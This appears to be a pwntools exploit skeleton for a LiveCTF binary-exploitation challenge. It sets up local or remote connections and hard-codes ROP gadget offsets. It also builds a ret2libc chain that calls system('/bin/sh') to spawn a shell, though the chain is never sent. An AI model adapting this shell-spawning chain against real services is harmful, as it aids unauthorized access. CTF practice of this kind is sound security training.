from pwn import *
global p

context.log_level='debug'
context.arch='amd64'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.terminal = "kitty"

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
local = True

# p = process("/bin/env")

libc = ELF('./libc.so.6')
p = process("/bin/env",env={'LD_PRELOAD':"./libc.so.6"})

if local:
    p = process('./challenge')
    print("X")
else:
    p = remote(HOST, int(PORT))


ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)


rdi     = 0x000000000002a3e5
rsi     = 0x000000000002be51
rdx     = 0x000000000011f2e7
system  = libc.sym['system']
shstr   = libc.search(b"/bin/sh").__next__()
ropchain = [rdi+1,rdi,shstr,system]


gdb.attach(p,"")

# p.sendline(b"./submitter")
# warning('%s', p.recvline_contains(b'LiveCTF{').decode().strip())
p.interactive()

